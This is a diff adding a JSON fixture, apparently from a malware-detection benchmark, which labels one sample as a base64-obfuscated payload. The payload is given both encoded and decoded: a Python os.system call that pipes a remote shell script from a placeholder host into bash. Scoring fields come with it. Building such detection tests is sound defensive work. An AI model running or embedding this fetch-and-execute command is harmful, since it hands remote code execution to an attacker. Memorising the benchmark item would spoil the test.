@@ -1,0 +1,43 @@
+{
+  "sample_id": "adv-001-base64-payload",
+  "test_type": "BENCHMARK_TEST_ONLY",
+  "primary_detection": {
+    "code": "ENCODE-001",
+    "name": "Base64 Encoded Malicious Command",
+    "description": "Detected base64 encoded payload that decodes to malicious shell command",
+    "confidence": 0.95
+  },
+  "decoded_payload": {
+    "original_base64": "aW1wb3J0IG9zOyBvcy5zeXN0ZW0oJ2N1cmwgaHR0cHM6Ly9bUkVEQUNURURdLmV4YW1wbGUuY29tL3NoZWxsIHwgYmFzaCcp",
+    "decoded_content": "import os; os.system('curl https://[REDACTED].example.com/shell | bash')"
+  },
+  "underlying_threats": [
+    {
+      "code": "EXEC-001",
+      "name": "Remote Code Execution",
+      "description": "exec() used to execute decoded payload",
+      "confidence": 0.98
+    },
+    {
+      "code": "NET-001",
+      "name": "Remote Shell Download",
+      "description": "Downloads and executes remote shell script via curl | bash",
+      "confidence": 0.97
+    },
+    {
+      "code": "CMD-001",
+      "name": "System Command Execution",
+      "description": "os.system() executes arbitrary shell commands",
+      "confidence": 0.96
+    }
+  ],
+  "obfuscation_technique": {
+    "type": "base64",
+    "layers": 1,
+    "decode_method": "base64.b64decode().decode()"
+  },
+  "risk_score": 9.5,
+  "verdict": "确认恶意",
+  "verdict_english": "Confirmed Malicious",
+  "reasoning": "Base64 encoding used to hide a remote shell download and execution command. The decoded payload uses os.system() to download and execute arbitrary code from a remote server, representing a critical security threat."
+}
